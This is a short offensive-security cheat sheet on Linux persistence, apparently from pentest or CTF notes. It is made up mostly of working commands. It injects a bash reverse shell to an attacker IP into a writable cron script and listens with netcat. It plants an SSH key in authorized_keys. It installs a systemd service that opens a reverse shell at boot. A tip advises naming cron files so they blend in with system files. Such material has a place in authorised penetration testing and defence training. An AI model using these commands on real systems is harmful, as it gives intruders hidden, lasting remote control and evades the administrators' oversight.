# Linux Persistence

!!! tip "Stealthy vs quick"
    Cron (`* * * * * /tmp/.x`) is quick but obvious in `crontab -l`. For stealth, add to `/etc/cron.d/` with a blending name (`logrotate-extra`). SSH `authorized_keys` is most reliable — survives reboots and doesn't show in process listings.

---

## Cron Job Persistence

### Identify Writable Cron Jobs

```bash
ls -lah /etc/cron*
cat /etc/crontab
crontab -l
grep "CRON" /var/log/syslog
```

### Inject Reverse Shell into Writable Cron Job

```bash
echo "bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1" >> /home/user/backup.sh
nc -lvnp 4444
```

---

## SSH Key Persistence

```bash
ssh-keygen -t rsa -b 4096 -f ~/.ssh/persistent_key
echo "ssh-rsa AAAAB3..." >> ~/.ssh/authorized_keys
ssh -i persistent_key <user>@10.10.10.10
```

---

## Systemd Service Persistence

1. Create a service file at `/etc/systemd/system/persistence.service`:

    ```
    [Unit]
    Description=Persistence Service
    After=multi-user.target

    [Service]
    Type=simple
    ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1'

    [Install]
    WantedBy=multi-user.target
    ```

2. Enable and start:

    ```bash
    systemctl enable persistence.service
    systemctl start persistence.service
    ```
